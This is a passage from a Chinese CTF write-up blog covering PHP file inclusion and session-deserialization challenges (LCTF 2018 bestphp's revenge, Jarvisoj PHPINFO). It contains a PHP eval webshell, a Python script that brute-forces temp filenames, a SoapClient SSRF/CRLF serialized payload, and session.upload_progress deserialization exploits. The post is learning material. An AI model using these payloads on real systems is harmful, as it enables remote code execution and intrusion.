+&lt;?php echo &#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#34;;@eval($_POST[&#39;cmd&#39;]);  ?&gt;
+------WebKitFormBoundaryeScXqSzdW2v22xyk--
+</code></pre></div><p>上帝视角看的话是这样</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png alt=image-20211129183250382></p>
+<p>用py脚本爆破出来(py2)</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+<span style=color:#f92672>import</span> <span style=color:#111>string</span>
+
+<span style=color:#111>charset</span> <span style=color:#f92672>=</span> <span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>digits</span> <span style=color:#f92672>+</span> <span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>letters</span>
+
+<span style=color:#111>host</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;10.99.99.16&#34;</span>
+<span style=color:#111>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>80</span>
+<span style=color:#111>base_url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://</span><span style=color:#d88200>%s</span><span style=color:#d88200>:</span><span style=color:#d88200>%d</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>host</span><span style=color:#111>,</span> <span style=color:#111>port</span><span style=color:#111>)</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>brute_force_tmp_files</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>for</span> <span style=color:#111>j</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>for</span> <span style=color:#111>k</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
+                <span style=color:#00a8c8>for</span> <span style=color:#111>l</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
+                    <span style=color:#00a8c8>for</span> <span style=color:#111>m</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
+                        <span style=color:#00a8c8>for</span> <span style=color:#111>n</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
+                            <span style=color:#111>filename</span> <span style=color:#f92672>=</span> <span style=color:#111>i</span> <span style=color:#f92672>+</span> <span style=color:#111>j</span> <span style=color:#f92672>+</span> <span style=color:#111>k</span> <span style=color:#f92672>+</span> <span style=color:#111>l</span> <span style=color:#f92672>+</span> <span style=color:#111>m</span> <span style=color:#f92672>+</span> <span style=color:#111>n</span>
+                            <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;</span><span style=color:#d88200>%s</span><span style=color:#d88200>/index.php?function=extract&amp;file=/tmp/php</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span>
+                                <span style=color:#111>base_url</span><span style=color:#111>,</span> <span style=color:#111>filename</span><span style=color:#111>)</span>
+                            <span style=color:#111>print</span> <span style=color:#111>url</span>
+                            <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+                                <span style=color:#111>response</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>)</span>
+                                <span style=color:#00a8c8>if</span> <span style=color:#d88200>&#39;wwwwwwwwwwwwww&#39;</span> <span style=color:#f92672>in</span> <span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#111>content</span><span style=color:#111>:</span>
+                                    <span style=color:#111>print</span> <span style=color:#d88200>&#34;[+] Include success!&#34;</span>
+                                    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>True</span>
+                            <span style=color:#00a8c8>except</span> <span style=color:#75af00>Exception</span> <span style=color:#00a8c8>as</span> <span style=color:#111>e</span><span style=color:#111>:</span>
+                                <span style=color:#111>print</span> <span style=color:#111>e</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>False</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>main</span><span style=color:#111>():</span>
+    <span style=color:#111>brute_force_tmp_files</span><span style=color:#111>()</span>
+
+
+<span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
+    <span style=color:#111>main</span><span style=color:#111>()</span>
+</code></pre></div><p>爆破成功后就拿到了shell，其余跟上面一样</p>
+<h3 id=lctf-2018bestphps-revenge>[LCTF 2018]bestphp&rsquo;s revenge</h3>
+<p>————这个栗子结合了SoapClient和session的考点</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#75af00>highlight_file</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+<span style=color:#111>$b</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;implode&#39;</span><span style=color:#111>;</span>
+<span style=color:#75af00>call_user_func</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#75af00>f</span><span style=color:#111>],</span><span style=color:#111>$_POST</span><span style=color:#111>);</span>
+<span style=color:#75af00>session_start</span><span style=color:#111>();</span>
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>isset</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#75af00>name</span><span style=color:#111>])){</span>
+    <span style=color:#111>$_SESSION</span><span style=color:#111>[</span><span style=color:#75af00>name</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#75af00>name</span><span style=color:#111>];</span>
+<span style=color:#111>}</span>
+<span style=color:#75af00>var_dump</span><span style=color:#111>(</span><span style=color:#111>$_SESSION</span><span style=color:#111>);</span>
+<span style=color:#111>$a</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>array</span><span style=color:#111>(</span><span style=color:#75af00>reset</span><span style=color:#111>(</span><span style=color:#111>$_SESSION</span><span style=color:#111>),</span><span style=color:#d88200>&#39;welcome_to_the_lctf2018&#39;</span><span style=color:#111>);</span>
+<span style=color:#75af00>call_user_func</span><span style=color:#111>(</span><span style=color:#111>$b</span><span style=color:#111>,</span><span style=color:#111>$a</span><span style=color:#111>);</span>
+</code></pre></div><p>看到了我们的老朋友<code>call_user_func</code>，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；<code>call_user_func</code>函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如<code>extract</code></p>
+<p>flag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png alt=image-20211128225823073></p>
+<p>这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中</p>
+<p>内置类<code>SoapClient()</code>满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用<code>__call</code></p>
+<p>所以整体思路是这样的：</p>
+<ol>
+<li>覆盖序列化引擎为<code>php_serialize</code>， 通过<code>session_start</code>将一个序列化的<code>SoapClient</code>写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以</li>
+<li>第一个<code>call_user_func</code>通过<code>extract</code>变量覆盖使<code>$b = call_user_func</code>，第二个<code>call_user_func</code>调用<code>SoapClient->__call</code>（不可访问的方法 call_user_func）</li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#111>$target</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;http://127.0.0.1/flag.php&#39;</span><span style=color:#111>;</span>
+<span style=color:#111>$b</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>SoapClient</span><span style=color:#111>(</span><span style=color:#00a8c8>null</span><span style=color:#111>,</span><span style=color:#00a8c8>array</span><span style=color:#111>(</span><span style=color:#d88200>&#39;location&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#111>$target</span><span style=color:#111>,</span>
+    <span style=color:#d88200>&#39;user_agent&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;AAA:BBB</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>.</span>
+        <span style=color:#d88200>&#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&#34;</span><span style=color:#111>,</span>
+    <span style=color:#d88200>&#39;uri&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#34;http://127.0.0.1/&#34;</span><span style=color:#111>));</span>
+<span style=color:#111>$se</span> <span style=color:#f92672>=</span> <span style=color:#75af00>serialize</span><span style=color:#111>(</span><span style=color:#111>$b</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;|&#34;</span><span style=color:#f92672>.</span><span style=color:#75af00>urlencode</span><span style=color:#111>(</span><span style=color:#111>$se</span><span style=color:#111>);</span>
+<span style=color:#75715e>// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+</span></code></pre></div><pre tabindex=0><code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f=session_start
+Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
+
+POST: serialize_handler=php_serialize
+</code></pre><pre tabindex=0><code>/?name=Soapclient&amp;f=extract
+Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
+
+POST: b=call_user_func
+</code></pre><p>之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png alt=image-20211129123843040></p>
+<h3 id=jarvisoj-webphpinfo>[Jarvisoj web]PHPINFO</h3>
+<p><a href=http://web.jarvisoj.com:32784/index.php>这里是题目页面</a>；开幕源码</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#75715e>//A webshell is wait for you
+</span><span style=color:#75715e></span><span style=color:#75af00>ini_set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;session.serialize_handler&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;php&#39;</span><span style=color:#111>);</span>
+<span style=color:#75af00>session_start</span><span style=color:#111>();</span>
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>OowoO</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>public</span> <span style=color:#111>$mdzz</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>()</span>
+    <span style=color:#111>{</span>
+        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>mdzz</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;phpinfo();&#39;</span><span style=color:#111>;</span>
+    <span style=color:#111>}</span>
+
+    <span style=color:#00a8c8>function</span> <span style=color:#111>__destruct</span><span style=color:#111>()</span>
+    <span style=color:#111>{</span>
+        <span style=color:#00a8c8>eval</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>mdzz</span><span style=color:#111>);</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>isset</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;phpinfo&#39;</span><span style=color:#111>]))</span>
+<span style=color:#111>{</span>
+    <span style=color:#111>$m</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>OowoO</span><span style=color:#111>();</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>else</span>
+<span style=color:#111>{</span>
+    <span style=color:#75af00>highlight_string</span><span style=color:#111>(</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index.php&#39;</span><span style=color:#111>));</span>
+<span style=color:#111>}</span>
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>先看看phpinfo，应该有提示信息；发现<code>session.upload_progress.enabled=On</code>，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入</p>
+<p>序列化exp</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#75af00>ini_set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;session.serialize_handler&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;php_serialize&#39;</span><span style=color:#111>);</span>
+<span style=color:#75af00>session_start</span><span style=color:#111>();</span>
+<span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>OowoO</span>
+<span style=color:#111>{</span>
+    <span style=color:#00a8c8>public</span> <span style=color:#111>$mdzz</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;print_r(scandir(dirname(__FILE__)));&#39;</span><span style=color:#111>;</span>
+<span style=color:#111>}</span>
+<span style=color:#111>$obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>OowoO</span><span style=color:#111>();</span>
+<span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;|&#34;</span><span style=color:#f92672>.</span><span style=color:#75af00>serialize</span><span style=color:#111>(</span><span style=color:#111>$obj</span><span style=color:#111>);</span>
+<span style=color:#75715e>// |O:5:&#34;OowoO&#34;:1:{s:4:&#34;mdzz&#34;;s:36:&#34;print_r(scandir(dirname(__FILE__)));&#34;;}
+</span></code></pre></div><p>构造上传表单，注意文件名的引号要加反斜杠转义</p>
+<pre tabindex=0><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png alt=image-20211129212625924></p>
+<p>然后访问这个php</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>public</span> <span style=color:#111>$mdzz</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;print_r(file_get_contents(&#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#34;));&#39;</span><span style=color:#111>;</span>
+</code></pre></div><pre tabindex=0><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}
+</code></pre><p>得到flag</p>
+<hr>
+<p>呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、</p>
+<p>最近的计划和安排就是刷题&把之前的知识体系填充完整，加油啦</p>
+<hr>
+<details>
+<summary>
+<h4 class=inline>
+以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
+</h4>
+</summary>
+<p><a href=https://xz.aliyun.com/t/3339#toc-3>LCTF 2018 Writeup &ndash; ROIS</a></p>
+<p><a href=https://www.jianshu.com/p/dfd049924258>LFI via SegmentFault</a></p>
+<p><a href=https://blog.spoock.com/2016/10/16/php-serialize-problem/>PHP中SESSION反序列化机制</a></p>
+<p><a href=https://www.freebuf.com/news/202819.html>利用session.upload_progress进行文件包含和反序列化渗透</a></p>
+<p>如有遗漏请指正！！！</p>
+</details>
+</div>
+</section>
+</article>
+</main>
+<div class="w-full h-0 flex-none order-3"></div>
+<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+<div class="md:max-w-xs flex flex-col md:items-end">
+<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+<li class="px-1 md:px-0">
+<a href=/posts/ title="Posts page">
+Posts
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/relax/ title="Relaxxx page">
+Relaxxx
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/categories/ title="Categories page">
+Categories
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/tags/ title="Tags page">
+Tags
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/series/ title="Series page">
+Series
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/about/ title="About page">
+About
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/friends/ title="Friends page">
+Friends
+</a>
+</li>
+<div id=fastSearch class=m-0>
+<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
+placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
+<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
+</ul>
+</div>
+</ul>
+<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
+<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
+</div>
+</a>
+<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
+</div>
+</a>
+<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
+</div>
+</a>
+<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 